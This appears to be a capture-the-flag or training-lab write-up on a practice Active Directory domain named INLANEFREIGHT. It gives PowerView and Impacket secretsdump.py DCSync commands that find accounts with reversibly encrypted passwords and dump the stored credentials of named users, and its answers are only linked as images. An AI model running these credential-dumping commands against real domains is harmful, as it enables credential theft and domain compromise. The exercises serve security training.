# Content

- [Content](#content)
  - [Question 1](#question-1)
    - [The way to hack](#the-way-to-hack)
    - [Answer](#answer)
  - [Question 2](#question-2)
    - [The way to hack](#the-way-to-hack-1)
    - [Answer](#answer-1)
  - [Question 3](#question-3)
    - [The way to hack](#the-way-to-hack-2)
    - [Answer](#answer-2)
  
## Question 1

### The way to hack

- I use command
- Payload:
  - Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ![Picture](../../Image/An%20ACE%20in%20the%20Hole/26.png)

### Answer

![Picture](../../Image/An%20ACE%20in%20the%20Hole/27.png)

## Question 2

### The way to hack

- I user secretsdump to get the clear text.
- Payload:
  - [secretsdump.py](http://secretsdump.py/) -outputfile inlanefreight_hashes -just-dc-user syncron INLANEFREIGHT/adunn@172.16.5.5
  ![Picture](../../Image/An%20ACE%20in%20the%20Hole/28.png)

### Answer

![Picture](../../Image/An%20ACE%20in%20the%20Hole/29.png)

## Question 3

### The way to hack

- I use secretsdump to get the hash for user khartsfield.
- Payload:
  - [secretsdump.py](http://secretsdump.py/) -outputfile inlanefreight_hashes -just-dc-user khartsfield INLANEFREIGHT/adunn@172.16.5.5
  ![Picture](../../Image/An%20ACE%20in%20the%20Hole/30.png)

### Answer

![Picture](../../Image/An%20ACE%20in%20the%20Hole/31.png)